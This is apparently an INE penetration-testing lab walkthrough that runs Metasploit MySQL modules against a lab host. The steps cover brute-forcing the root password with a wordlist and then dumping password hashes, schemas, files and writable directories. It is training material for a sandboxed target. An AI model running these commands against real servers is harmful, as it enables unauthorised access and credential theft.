MySQL is an open-source relational database management system (RDBMS). It is one of the most widely used database systems in the world and is commonly used in web applications and is a central component of the LAMP stack (Linux, Apache, MySQL, PHP/Python/Perl). The default port for MySQL server is 3306. This port is used for client-server communication in MySQL database management systems.

In this lab, we will take a look at different auxiliary modules in Metasploit related to MySQL that we can run against the target to gather sensitive information.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a MySQL service will be accessible at **demo.ine.local**.

**Objective:** Your task is to run the following auxiliary modules against the target:

- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_login
- auxiliary/admin/mysql/mysql_enum
- auxiliary/admin/mysql/mysql_sql
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_hashdump
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_writable_dirs

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
_________

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/6d9a8442bc07b61fc9e985eb00949aa3a0c162f757b1e755e79ac44dc0eaa1d2.jpg)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/8cb50d8d0658b7883ce67aa1f70db06afa2174da56d287a92add45f3365ad079.jpg)

The target is reachable.

**Step 3:** Run an nmap scan against the target:

**Command:**

```
nmap demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/7a2b6647cc6df504f8fb71549900f9c2c4062f1172309bb1e0b7dadf947bd0b9.jpg)

MySQL service is running on the target.

**Step 4:** Run the **auxiliary/scanner/mysql/mysql_version** module.

**Commands:**

```
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

![Content Image](https://assets.ine.com/lab/learningpath/3f38acc0650d0461175fd42135c9f7f3f70358ec90329b7ff8ad0154bf0f2d6c.jpg)

**Step 5:**: Run the **auxiliary/scanner/mysql/mysql_login** module.

**Commands:**

```
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

![Content Image](https://assets.ine.com/lab/learningpath/15c163c76fe464f45ec1671d1366ac7facd33299c11fd4808c32d6f17cf309e1.jpg)

**Step 6:** Run the **auxiliary/admin/mysql/mysql_enum** module.

**Commands:**

```
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

![Content Image](https://assets.ine.com/lab/learningpath/6de996f8d3b92e0541b868f561d44bf4537bb155d3818ac3fcd2fc72fa718603.jpg)

**Step 7:** Run the **auxiliary/admin/mysql/mysql_sql** module.

**Commands:**

```
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

![Content Image](https://assets.ine.com/lab/learningpath/a8b50efa19fd2d98b49dbde86dd274662ecdcd604460060815b24c7d9ac6bd39.jpg)

**Step 8:** Run the **auxiliary/scanner/mysql/mysql_file_enum** module.

**Commands:**

```
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

![Content Image](https://assets.ine.com/lab/learningpath/15c9a50ceba17c337d68cecae28480e074e2654268da0dcff1e743d2948fe46f.jpg)

**Step 9:** Run the **auxiliary/scanner/mysql/mysql_hashdump** module.

**Commands:**

```
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

![Content Image](https://assets.ine.com/lab/learningpath/9e87a337c537fd4d1c856db08875ef994622f0c4b99e92a521bfed9740a4a9d2.jpg)

**Step 10:** Run the **auxiliary/scanner/mysql/mysql_schemadump** module.

**Commands:**

```
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

![Content Image](https://assets.ine.com/lab/learningpath/635146801144962869906875e020ce497a50fe4f4e877bea67d6d7b3e5ad4e8e.jpg)

**Step 11:** Run the **auxiliary/scanner/mysql/mysql_writable_dirs** module.

**Commands:**

```
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

![Content Image](https://assets.ine.com/lab/learningpath/7bcbfa099222dca93f6d605df2f25df2e84c3b18708ba78736779011861fa4e4.jpg)

# Conclusion

In this lab, we explored different MySQL related metasploit modules that we can run against the target and gather sensitive information.

# References

- [MySQL](https://www.mysql.com/)
- Metasploit Modules:
    - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_version
    - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login
    - https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum
    - https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_sql
    - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_file_enum
    - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump
    - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump
    - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_writable_dirs)